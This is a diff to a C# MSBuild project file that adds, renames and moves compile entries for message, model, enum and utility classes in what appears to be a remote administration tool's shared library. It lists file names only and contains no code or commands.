@@ -45,14 +45,18 @@
     <Reference Include="System.ServiceModel" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Enums\ContentType.cs" />
+    <Compile Include="Models\Drive.cs" />
     <Compile Include="Messages\MessageProcessorBase.cs" />
     <Compile Include="Messages\IProgress.cs" />
     <Compile Include="Messages\MessageHandler.cs" />
     <Compile Include="Messages\ICommandExecutor.cs" />
     <Compile Include="Enums\MouseAction.cs" />
-    <Compile Include="Enums\PathType.cs" />
+    <Compile Include="Enums\FileType.cs" />
     <Compile Include="Enums\ShutdownAction.cs" />
     <Compile Include="Enums\UserStatus.cs" />
+    <Compile Include="Models\FileSystemEntry.cs" />
+    <Compile Include="Models\StartupItem.cs" />
     <Compile Include="NativeMethods.cs" />
     <Compile Include="Messages\DoDownloadFileResponse.cs" />
     <Compile Include="Messages\DoShellExecuteResponse.cs" />
@@ -81,7 +85,7 @@
     <Compile Include="Messages\SetStatusFileManager.cs" />
     <Compile Include="Messages\SetUserStatus.cs" />
     <Compile Include="Messages\IMessage.cs" />
-    <Compile Include="Messages\PacketRegistery.cs" />
+    <Compile Include="Messages\PacketRegistry.cs" />
     <Compile Include="Messages\ReverseProxyConnect.cs" />
     <Compile Include="Messages\ReverseProxyConnectResponse.cs" />
     <Compile Include="Messages\ReverseProxyData.cs" />
@@ -134,8 +138,9 @@
     <Compile Include="Messages\SetAuthenticationSuccess.cs" />
     <Compile Include="Networking\ISender.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
-    <Compile Include="Registry\RegSeekerMatch.cs" />
-    <Compile Include="Registry\RegValueData.cs" />
+    <Compile Include="Models\RegSeekerMatch.cs" />
+    <Compile Include="Models\RegValueData.cs" />
+    <Compile Include="Utilities\SafeRandom.cs" />
     <Compile Include="Video\Codecs\UnsafeStreamCodec.cs" />
     <Compile Include="Video\Compression\JpgCompression.cs" />
     <Compile Include="Video\Resolution.cs" />
@@ -143,5 +148,6 @@
   <ItemGroup>
     <None Include="packages.config" />
   </ItemGroup>
+  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
